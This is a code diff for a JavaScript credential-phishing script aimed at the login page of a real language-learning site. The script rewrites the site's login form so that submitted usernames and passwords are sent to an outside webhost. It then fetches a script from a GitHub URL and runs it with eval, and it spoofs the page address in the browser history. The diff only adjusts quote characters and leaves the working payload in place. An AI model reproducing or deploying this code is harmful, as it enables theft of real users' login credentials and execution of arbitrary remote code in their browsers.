@@ -1,6 +1,6 @@
 var htmlreq = new XMLHttpRequest();
 htmlreq.open("GET", "https://spanish.yabla.com/login.php", true);
 htmlreq.send(null);
-var pl = "fetch('https://paramagnetic-shotli.000webhostapp.com/o.php?d=' + document.getElementById('username').value + ':' + document.getElementsByName('password')[0].value); setTimeout(() => {if (window.location.href.split("error").length == 2) { fetch('https://raw.githubusercontent.com/jellyassassin25/snake/main/snake2.txt').then(r => r.text()).then(t => eval(t))}}, 2500)";
+var pl = "fetch('https://paramagnetic-shotli.000webhostapp.com/o.php?d=' + document.getElementById('username').value + ':' + document.getElementsByName('password')[0].value); setTimeout(() => {if (window.location.href.split('error').length == 2) { fetch('https://raw.githubusercontent.com/jellyassassin25/snake/main/snake2.txt').then(r => r.text()).then(t => eval(t))}}, 2500)";
 htmlreq.onreadystatechange = function() {if (htmlreq.readyState == 4) {document.open(); document.write(htmlreq.responseText.split('<form name="login" id="login_form" method="post" action="login.php">').join('<form name="login" id="login_form" method="post" action="login.php" onsubmit="' + pl + '">'))}};
 window.history.pushState("test2", "", "/login.php");
